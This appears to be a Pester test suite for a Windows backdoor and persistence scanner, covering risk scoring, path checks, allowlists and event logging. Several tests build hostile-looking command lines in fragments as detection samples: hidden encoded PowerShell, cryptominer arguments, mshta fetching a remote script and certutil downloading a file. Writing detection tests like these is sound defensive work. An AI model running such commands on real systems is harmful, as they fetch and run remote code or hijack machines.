# Basic rules: paths, risk score, suspicious command lines.

BeforeAll {
    . "$PSScriptRoot\TestHelpers.ps1"
    . (Get-ModuleScript Common)
    . (Get-ModuleScript CommandRisk)
}

Describe 'ConvertTo-Severity' {
    It 'gives <Expected> to score <Score>' -ForEach @(
        @{ Score = 60; Expected = 'High' }, @{ Score = 59; Expected = 'Medium' }, @{ Score = 35; Expected = 'Medium' }
        @{ Score = 34; Expected = 'Low' }, @{ Score = 15; Expected = 'Low' }, @{ Score = 14; Expected = 'Info' }
    ) {
        ConvertTo-Severity $Score | Should -Be $Expected
    }
}

Describe 'Test-UserWritablePath' {
    It 'treats <Path> as writable' -ForEach @(
        @{ Path = 'C:\Users\bob\AppData\Roaming\x.exe' }, @{ Path = 'C:\ProgramData\x.exe' }
        @{ Path = 'C:\Windows\Temp\a.exe' }, @{ Path = 'C:\Users\Public\a.exe' }, @{ Path = 'C:\Users\bob\Downloads\a.exe' }
    ) {
        Test-UserWritablePath $Path | Should -BeTrue
    }
    It 'does not treat <Path> as writable' -ForEach @(
        @{ Path = 'C:\Program Files\App\app.exe' }, @{ Path = 'C:\Windows\System32\cmd.exe' }, @{ Path = '' }
    ) {
        Test-UserWritablePath $Path | Should -BeFalse
    }
}

Describe 'Resolve-CommandPath' {
    It 'extracts the program from <Command>' -ForEach @(
        @{ Command = '"C:\Program Files\App\app.exe" --flag'; Expected = 'C:\Program Files\App\app.exe' }
        @{ Command = 'C:\Program Files\App\app.exe --flag'; Expected = 'C:\Program Files\App\app.exe' }
        @{ Command = '\??\C:\Windows\x.sys'; Expected = 'C:\Windows\x.sys' }
    ) {
        Resolve-CommandPath $Command | Should -Be $Expected
    }
    It 'expands environment variables' {
        Resolve-CommandPath '%SystemRoot%\system32\svchost.exe -k netsvcs' | Should -Be "$env:SystemRoot\system32\svchost.exe"
    }
    It 'resolves \SystemRoot\ in drivers' {
        Resolve-CommandPath '\SystemRoot\System32\drivers\x.sys' | Should -Be "$env:SystemRoot\System32\drivers\x.sys"
    }
    It 'finds a program without a path in System32' {
        Resolve-CommandPath 'rundll32.exe shell32.dll,Control_RunDLL' | Should -Be "$env:SystemRoot\System32\rundll32.exe"
    }
    It 'returns $null for an empty line' {
        Resolve-CommandPath '   ' | Should -BeNullOrEmpty
    }
}

Describe 'Get-EmbeddedPaths' {
    It 'finds the DLL passed to rundll32' {
        Get-EmbeddedPaths 'rundll32.exe C:\Users\x\AppData\Roaming\a.dll,Start' | Should -Contain 'C:\Users\x\AppData\Roaming\a.dll'
    }
    It 'finds the script passed to wscript' {
        Get-EmbeddedPaths 'wscript.exe "C:\ProgramData\run.vbs" //B' | Should -Contain 'C:\ProgramData\run.vbs'
    }
}

Describe 'Get-CommandRisk' {
    It 'rates hidden PowerShell with a Base64 command as High' {
        $r = Get-CommandRisk (@('power', 'shell.exe', ' -no', 'p', ' -w', ' hid', 'den', ' -e', 'nc ', (New-HarmlessEncodedCommand)) -join '')
        ConvertTo-Severity $r.Score | Should -Be 'High'
        $r.Reasons -join ' ' | Should -Match 'Base64'
    }
    It 'rates cryptominer parameters as High' {
        $r = Get-CommandRisk (@('"C:\Nonexistent\svc.exe" -', 'o pool', '.example.com:', '4444 -', 'u 4Abc --don', 'ate-level 1') -join '')
        ConvertTo-Severity $r.Score | Should -Be 'High'
    }
    It 'recognizes mshta running a remote script' {
        (Get-CommandRisk (@('msh', 'ta.exe ', 'https', '://example.invalid/a.hta') -join '')).Score | Should -BeGreaterOrEqual 50
    }
    It 'recognizes certutil used to download' {
        (Get-CommandRisk (@('cert', 'util.exe', ' -url', 'cache', ' -f ', 'http', '://203.0.113.5/a a') -join '')).Score | Should -BeGreaterOrEqual 60
    }
    It 'does not flag a Microsoft program without suspicious arguments' {
        (Get-CommandRisk "`"$env:SystemRoot\System32\cmd.exe`"").Score | Should -Be 0
    }
    It 'flags an entry that points to a missing file' {
        $r = Get-CommandRisk '"C:\Nonexistent\ghost.exe"'
        $r.Score | Should -Be 10
        $r.Reasons -join ' ' | Should -Match 'no longer exists'
    }
    It 'flags an unsigned script in a user folder' {
        $vbs = Join-Path $TestDrive 'xkqzvbtr.vbs'
        Set-Content -LiteralPath $vbs -Value 'WScript.Echo 1'
        $r = Get-CommandRisk "wscript.exe `"$vbs`""
        $r.Target | Should -Be $vbs
        ConvertTo-Severity $r.Score | Should -BeIn 'Medium', 'High'
    }
}

Describe 'Test-RandomLookingName' {
    It 'recognizes <Path> as random' -ForEach @(@{ Path = 'C:\x\xkqzvbtr.exe' }, @{ Path = 'C:\x\a8f3c1d9e2.exe' }) {
        Test-RandomLookingName $Path | Should -BeTrue
    }
    It 'does not treat <Path> as random' -ForEach @(@{ Path = 'C:\x\Discord.exe' }, @{ Path = 'C:\x\pngcrush_1_8_11_w64.exe' }, @{ Path = 'C:\x\setup.exe' }) {
        Test-RandomLookingName $Path | Should -BeFalse
    }
}

Describe 'Get-EditDistance' {
    It 'measures <A> against <B>' -ForEach @(
        @{ A = 'svch0st'; B = 'svchost'; D = 1 }, @{ A = 'lsass'; B = 'lsass'; D = 0 }, @{ A = 'explorer'; B = 'iexplore'; D = 2 }
    ) {
        Get-EditDistance $A $B | Should -Be $D
    }
}

Describe 'Get-FindingId' {
    It 'gives the same ID to the same item' {
        Get-FindingId 'Services' 'X' 'C:\a.exe' 'ev' | Should -Be (Get-FindingId 'Services' 'X' 'C:\a.exe' 'ev')
    }
    It 'ignores case (Windows paths do too)' {
        Get-FindingId 'Services' 'X' 'C:\A.EXE' 'ev' | Should -Be (Get-FindingId 'Services' 'X' 'c:\a.exe' 'ev')
    }
    It 'changes when the item changes' {
        Get-FindingId 'Services' 'X' 'C:\a.exe' 'ev' | Should -Not -Be (Get-FindingId 'Services' 'Y' 'C:\a.exe' 'ev')
    }
    It 'is made of 16 hexadecimal digits' {
        Get-FindingId 'a' 'b' 'c' 'd' | Should -Match '^[0-9a-f]{16}$'
    }
}

Describe 'Write-ScanEvent' {
    BeforeEach { $script:EventSink = $null; $script:EventSeq = 0 }
    AfterAll { $script:EventSink = $null }
    It 'writes nothing without an event file' {
        Write-ScanEvent 'test' @{ a = 1 }
        $script:EventSeq | Should -Be 0
    }
    It 'writes one numbered JSON line per event, with the schema' {
        $script:EventSink = Join-Path $TestDrive 'events.jsonl'
        # A non-ASCII character built in code: the test files stay ASCII
        $accented = "$([char]0xE8) ok"
        Write-ScanEvent 'one' @{ value = $accented }
        Write-ScanEvent 'two' @{ list = @(1, 2) }
        $lines = @(Get-Content -LiteralPath $script:EventSink -Encoding UTF8)
        $lines | Should -HaveCount 2
        $e = $lines | ForEach-Object { $_ | ConvertFrom-Json }
        $e[0].schema | Should -Be 'checkbackdoor.events/1'
        $e[0].data.value | Should -BeExactly $accented
        $e[0].seq | Should -Be 1
        $e[1].seq | Should -Be 2
        $e[1].type | Should -Be 'two'
        $e[1].data.list | Should -HaveCount 2
        $e[0].pid | Should -Be $PID
    }
}

Describe 'Add-Finding with events and allowlist' {
    BeforeEach {
        $script:Findings.Clear(); $script:IgnoredCount = 0; $script:EventSeq = 0
        $script:EventSink = Join-Path $TestDrive "events-$([guid]::NewGuid().ToString('N')).jsonl"
        $al = Join-Path $TestDrive 'allowlist.local.json'
        Set-Content -LiteralPath $al -Value '{ "paths": ["C:\\SafeApps\\*"], "sha256": [], "titles": ["*IgnoreMe*"] }'
        Import-Allowlist -Path $al
        $script:CurrentCheck = 'Persistence'
    }
    AfterEach { $script:EventSink = $null; $script:CurrentCheck = $null; Import-Allowlist -Path @() }
    It 'emits an event with the current check and the ID' {
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Entry' -Path 'C:\Other\x.exe'
        $e = Get-Content -LiteralPath $script:EventSink | ConvertFrom-Json
        $e.type | Should -Be 'finding'
        $e.data.check | Should -Be 'Persistence'
        $e.data.finding.Id | Should -Be $script:Findings[0].Id
        $script:Findings[0].Check | Should -Be 'Persistence'
    }
    It 'drops and counts allowlisted items, without an event' {
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'By path' -Path 'C:\SafeApps\x.exe'
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'IgnoreMe please'
        $script:Findings | Should -HaveCount 0
        $script:IgnoredCount | Should -Be 2
        Test-Path -LiteralPath $script:EventSink | Should -BeFalse
    }
    It 'ignores a single item by ID (the app list), not the others' {
        $app = Join-Path $TestDrive 'ignored-app.json'
        $id = Get-FindingId 'Autostart' 'Chosen entry' 'C:\Other\a.exe' $null
        Set-Content -LiteralPath $app -Value ('{ "ids": ["' + $id.ToUpperInvariant() + '"] }')
        Import-Allowlist -Path $app
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Chosen entry' -Path 'C:\Other\a.exe'
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Another entry' -Path 'C:\Other\a.exe'
        $script:Findings.Count | Should -Be 1
        $script:Findings[0].Title | Should -Be 'Another entry'
    }
    It 'lists what it hides, with the rule that hides it' {
        $script:Ignored.Clear()
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'By path' -Path 'C:\SafeApps\x.exe'
        $script:Ignored | Should -HaveCount 1
        $script:Ignored[0].Title | Should -Be 'By path'
        $script:Ignored[0].Rule | Should -Be 'path C:\SafeApps\*'
    }
    It 'does not apply and flags a rule that is too broad: <Rule>' -ForEach @(
        @{ Json = '{ "paths": ["*"] }'; Rule = '*' }
        @{ Json = '{ "paths": ["*.exe"] }'; Rule = '*.exe' }
        @{ Json = '{ "paths": ["C:\\*"] }'; Rule = 'C:\*' }
        @{ Json = '{ "paths": ["*\\AppData\\*"] }'; Rule = '*\AppData\*' }
        @{ Json = '{ "paths": ["C:\\ProgramData\\*"] }'; Rule = 'C:\ProgramData\*' }
        @{ Json = '{ "titles": ["*a*"] }'; Rule = '*a*' }
    ) {
        $al = Join-Path $TestDrive 'broad.json'
        Set-Content -LiteralPath $al -Value $Json
        Import-Allowlist -Path $al
        Add-AllowlistFindings
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Malware.exe' -Path "$env:ProgramData\malware.exe"
        $script:Findings | Should -HaveCount 2
        $script:Findings[0].Category | Should -Be 'Allowlist'
        $script:Findings[0].Title | Should -BeLike "*too broad*$Rule"
    }
    It 'the allowlist warning cannot be hidden with the allowlist' {
        $al = Join-Path $TestDrive 'sneaky.json'
        Set-Content -LiteralPath $al -Value '{ "paths": ["*"], "titles": ["Allowlist rule*"] }'
        Import-Allowlist -Path $al
        Add-AllowlistFindings
        $script:Findings | Should -HaveCount 1
    }
    It 'accepts a rule for the folder of a program' {
        Test-BroadAllowlistRule "$env:APPDATA\Spotify\*" -IsPath | Should -BeFalse
        Test-BroadAllowlistRule 'C:\Program Files\Game\game.exe' -IsPath | Should -BeFalse
    }
    It 'stops ignoring an item if the file changed' {
        $f = Join-Path $TestDrive 'ignored.exe'
        Set-Content -LiteralPath $f -Value 'before' -NoNewline
        $sha = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash
        $id = Get-FindingId 'Autostart' 'Ignored program' $f $null
        $app = Join-Path $TestDrive 'ignored-hash.json'
        Set-Content -LiteralPath $app -Value (@{ ids = @($id); items = @(@{ id = $id; sha256 = $sha.ToLowerInvariant() }) } | ConvertTo-Json -Depth 4)
        Import-Allowlist -Path $app
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Ignored program' -Path $f
        $script:Findings | Should -HaveCount 0

        Set-Content -LiteralPath $f -Value 'replaced' -NoNewline
        $script:FileCache.Clear()
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'Ignored program' -Path $f
        $script:Findings | Should -HaveCount 1
        $script:Findings[0].Reasons[0] | Should -Match 'no longer the same'
    }
    It 'reads the VirusTotal key encrypted with DPAPI, as the app saves it' {
        Add-Type -AssemblyName System.Security
        $blob = [Security.Cryptography.ProtectedData]::Protect([Text.Encoding]::UTF8.GetBytes('test-key'), $script:SecretEntropy, 'CurrentUser')
        $f = Join-Path $TestDrive 'virustotal.key'
        Set-Content -LiteralPath $f -Value ([Convert]::ToBase64String($blob))
        Read-ProtectedSecret -Path $f | Should -Be 'test-key'
        Read-ProtectedSecret -Path (Join-Path $TestDrive 'missing.key') | Should -BeNullOrEmpty
    }
    It 'keeps how to disable the item' {
        Add-Finding -Category 'Autostart' -Severity 'Medium' -Title 'With action' -Remedy @{ Kind = 'RegistryValue'; Key = 'HKCU:\x\Run'; Name = 'a'; Admin = $false }
        $script:Findings[0].Remedy.Kind | Should -Be 'RegistryValue'
    }
}

Describe 'Add-Finding' {
    BeforeEach { $script:Findings.Clear() }
    It 'records a finding with its reasons' {
        Add-Finding -Category 'Test' -Severity 'Medium' -Title 'X' -Path 'C:\Nonexistent\x.exe' -Reasons 'one', 'two'
        $script:Findings.Count | Should -Be 1
        $script:Findings[0].Reasons | Should -HaveCount 2
        $script:Findings[0].Sha256 | Should -BeNullOrEmpty
    }
    It 'computes the SHA-256 of an existing file' {
        $f = Join-Path $TestDrive 'a.txt'
        Set-Content -LiteralPath $f -Value 'hello' -NoNewline
        Add-Finding -Category 'Test' -Severity 'Low' -Title 'Y' -Path $f
        $script:Findings[0].Sha256 | Should -Be (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash
    }
}
